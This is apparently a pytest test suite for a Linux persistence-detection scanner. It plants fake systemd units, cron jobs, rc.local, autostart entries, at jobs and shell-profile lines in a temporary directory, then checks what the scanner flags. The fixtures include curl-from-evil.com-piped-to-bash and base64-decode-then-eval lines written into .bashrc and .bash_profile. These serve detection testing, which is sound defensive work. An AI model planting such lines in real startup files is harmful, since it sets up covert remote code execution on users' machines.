# SPDX-License-Identifier: Apache-2.0
# Copyright (C) 2026 Red Hat, Inc.
"""Tests for persistence_detector (ATT&CK T1037/T1547)."""

import json
import os
from pathlib import Path
from unittest.mock import patch

import pytest

from audit.persistence_detector import (
    Finding,
    is_package_owned,
    run_scan,
    scan_autostart,
    scan_cron,
    scan_rc_local,
    scan_shell_profiles,
    scan_systemd_units,
    scan_at_jobs,
    format_summary,
    main,
)


@pytest.fixture
def fake_env(tmp_path):
    """Create isolated fake root + home with standard directory structure."""
    home = tmp_path / "home" / "testuser"
    root = tmp_path / "sysroot"
    (home / ".config" / "systemd" / "user").mkdir(parents=True)
    (home / ".config" / "autostart").mkdir(parents=True)
    (root / "etc" / "systemd" / "system").mkdir(parents=True)
    (root / "etc" / "cron.d").mkdir(parents=True)
    (root / "etc" / "profile.d").mkdir(parents=True)
    (root / "etc" / "xdg" / "autostart").mkdir(parents=True)
    (root / "var" / "spool" / "at").mkdir(parents=True)
    return home, root


class TestSystemdUnits:
    def test_detects_non_package_unit(self, fake_env):
        home, root = fake_env
        unit = home / ".config" / "systemd" / "user" / "rogue.service"
        unit.write_text("[Unit]\nDescription=Rogue\n[Service]\nExecStart=/tmp/evil\n")

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            findings = scan_systemd_units(home=home, root=root)

        assert len(findings) == 1
        assert findings[0].type == "systemd"
        assert findings[0].technique_id == "T1547"
        assert findings[0].severity == "high"
        assert "rogue.service" in findings[0].detail

    def test_detects_system_unit(self, fake_env):
        home, root = fake_env
        unit = root / "etc" / "systemd" / "system" / "backdoor.service"
        unit.write_text("[Unit]\nDescription=Backdoor\n")

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            findings = scan_systemd_units(home=home, root=root)

        assert len(findings) == 1
        assert "backdoor.service" in findings[0].detail

    def test_ignores_non_unit_files(self, fake_env):
        home, root = fake_env
        readme = home / ".config" / "systemd" / "user" / "README.md"
        readme.write_text("just docs")

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            findings = scan_systemd_units(home=home, root=root)

        assert len(findings) == 0


class TestCron:
    def test_detects_non_package_cron(self, fake_env):
        _, root = fake_env
        job = root / "etc" / "cron.d" / "backdoor"
        job.write_text("* * * * * root /tmp/evil\n")

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            findings = scan_cron(root=root)

        assert len(findings) == 1
        assert findings[0].type == "cron"
        assert findings[0].technique_id == "T1037"

    def test_no_findings_on_empty(self, fake_env):
        _, root = fake_env
        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            findings = scan_cron(root=root)
        assert len(findings) == 0


class TestRcLocal:
    def test_detects_executable_rc_local(self, fake_env):
        _, root = fake_env
        rc = root / "etc" / "rc.local"
        rc.write_text("#!/bin/bash\n/tmp/evil --daemon\n")
        rc.chmod(0o755)

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            findings = scan_rc_local(root=root)

        assert len(findings) == 1
        assert findings[0].severity == "high"
        assert "1 active lines" in findings[0].detail

    def test_ignores_non_executable(self, fake_env):
        _, root = fake_env
        rc = root / "etc" / "rc.local"
        rc.write_text("#!/bin/bash\n/tmp/evil --daemon\n")
        rc.chmod(0o644)

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            findings = scan_rc_local(root=root)

        assert len(findings) == 0


class TestAutostart:
    def test_detects_non_package_desktop(self, fake_env):
        home, root = fake_env
        desktop = home / ".config" / "autostart" / "evil.desktop"
        desktop.write_text("[Desktop Entry]\nExec=/tmp/evil\n")

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            findings = scan_autostart(home=home, root=root)

        assert len(findings) == 1
        assert findings[0].type == "autostart"
        assert findings[0].technique_id == "T1547"

    def test_detects_system_autostart(self, fake_env):
        home, root = fake_env
        desktop = root / "etc" / "xdg" / "autostart" / "spy.desktop"
        desktop.write_text("[Desktop Entry]\nExec=/tmp/spy\n")

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            findings = scan_autostart(home=home, root=root)

        assert len(findings) == 1


class TestShellProfiles:
    def test_detects_curl_pipe_bash(self, fake_env):
        home, root = fake_env
        bashrc = home / ".bashrc"
        bashrc.write_text("# normal\nexport PATH=$PATH\ncurl http://evil.com/p | bash\n")

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            findings = scan_shell_profiles(home=home, root=root)

        assert len(findings) == 1
        assert findings[0].severity == "high"

    def test_detects_base64_decode(self, fake_env):
        home, root = fake_env
        profile = home / ".bash_profile"
        profile.write_text("eval $(echo 'payload' | base64 -d)\n")

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            findings = scan_shell_profiles(home=home, root=root)

        assert len(findings) == 1
        assert findings[0].severity == "high"

    def test_clean_bashrc_no_findings(self, fake_env):
        home, root = fake_env
        bashrc = home / ".bashrc"
        bashrc.write_text("# normal bashrc\nexport EDITOR=vim\nalias ll='ls -la'\n")

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            findings = scan_shell_profiles(home=home, root=root)

        assert len(findings) == 0

    def test_detects_non_package_profile_d(self, fake_env):
        home, root = fake_env
        script = root / "etc" / "profile.d" / "injected.sh"
        script.write_text("export EVIL=1\n")

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            findings = scan_shell_profiles(home=home, root=root)

        assert len(findings) == 1
        assert findings[0].type == "shell_profile"
        assert findings[0].severity == "medium"


class TestAtJobs:
    def test_detects_pending_job(self, fake_env):
        _, root = fake_env
        job = root / "var" / "spool" / "at" / "a00001019e3a5b"
        job.write_text("#!/bin/sh\n/tmp/evil\n")

        findings = scan_at_jobs(root=root)

        assert len(findings) == 1
        assert findings[0].type == "at_job"

    def test_ignores_dotfiles(self, fake_env):
        _, root = fake_env
        dotfile = root / "var" / "spool" / "at" / ".SEQ"
        dotfile.write_text("00001")

        findings = scan_at_jobs(root=root)
        assert len(findings) == 0


class TestIsPackageOwned:
    def test_owned_file(self):
        import subprocess
        result = subprocess.CompletedProcess(
            args=["rpm", "-qf", "/usr/bin/ls"],
            returncode=0,
            stdout="coreutils-9.5-1.fc44.x86_64\n",
            stderr="",
        )
        with patch("subprocess.run", return_value=result):
            assert is_package_owned("/usr/bin/ls") is True

    def test_unowned_file(self):
        import subprocess
        result = subprocess.CompletedProcess(
            args=["rpm", "-qf", "/tmp/evil"],
            returncode=1,
            stdout="file /tmp/evil is not owned by any package\n",
            stderr="",
        )
        with patch("subprocess.run", return_value=result):
            assert is_package_owned("/tmp/evil") is False


class TestFormatSummary:
    def test_no_findings(self):
        result = format_summary([])
        assert "No unauthorized" in result

    def test_with_findings(self):
        findings = [
            Finding("T1547", "systemd", "/etc/systemd/system/rogue.service", "high",
                    "Non-package systemd unit: rogue.service"),
            Finding("T1037", "cron", "/etc/cron.d/backdoor", "medium",
                    "Non-package cron entry: backdoor"),
        ]
        result = format_summary(findings)
        assert "2 findings" in result
        assert "HIGH: 1" in result
        assert "MEDIUM: 1" in result


class TestRunScan:
    def test_full_scan_isolated(self, fake_env):
        home, root = fake_env
        # Plant one finding in each category
        (home / ".config" / "systemd" / "user" / "rogue.timer").write_text("[Unit]\n")
        (root / "etc" / "cron.d" / "evil").write_text("* * * * * root /tmp/x\n")
        bashrc = home / ".bashrc"
        bashrc.write_text("curl http://x | bash\n")

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            findings = run_scan(home=home, root=root)

        types_found = {f.type for f in findings}
        assert "systemd" in types_found
        assert "cron" in types_found
        assert "shell_profile" in types_found


class TestMainCLI:
    def test_json_output(self, fake_env, capsys):
        home, root = fake_env
        unit = home / ".config" / "systemd" / "user" / "test.service"
        unit.write_text("[Unit]\nDescription=Test\n")

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            main(["--json", "--home", str(home), "--root", str(root)])

        captured = capsys.readouterr()
        data = json.loads(captured.out)
        assert isinstance(data, list)
        assert len(data) == 1
        assert data[0]["type"] == "systemd"

    def test_summary_output_default(self, fake_env, capsys):
        home, root = fake_env

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            main(["--home", str(home), "--root", str(root)])

        captured = capsys.readouterr()
        assert "No unauthorized" in captured.out

    def test_exit_code_high(self, fake_env):
        home, root = fake_env
        unit = home / ".config" / "systemd" / "user" / "bad.service"
        unit.write_text("[Unit]\n")

        with patch("audit.persistence_detector.is_package_owned", return_value=False):
            code = main(["--json", "--home", str(home), "--root", str(root)])

        assert code == 1
